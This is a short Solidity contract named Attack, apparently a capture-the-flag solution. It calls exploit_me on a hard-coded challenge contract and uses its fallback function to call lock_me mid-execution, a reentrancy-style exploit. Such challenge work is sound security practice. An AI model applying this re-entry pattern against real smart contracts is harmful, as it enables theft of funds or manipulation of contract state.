// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Uncomment this line to use console.log
// import "hardhat/console.sol";

interface challenge {
    function exploit_me(address winner) external;
    function lock_me() external;
    function winners(uint256) external view returns (address);

}

contract Attack {
    address Challenge = 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E;
    challenge chall = challenge(Challenge);

    function attack() public{
        chall.exploit_me(msg.sender);
    }

    fallback() external {
        chall.lock_me();
    }
}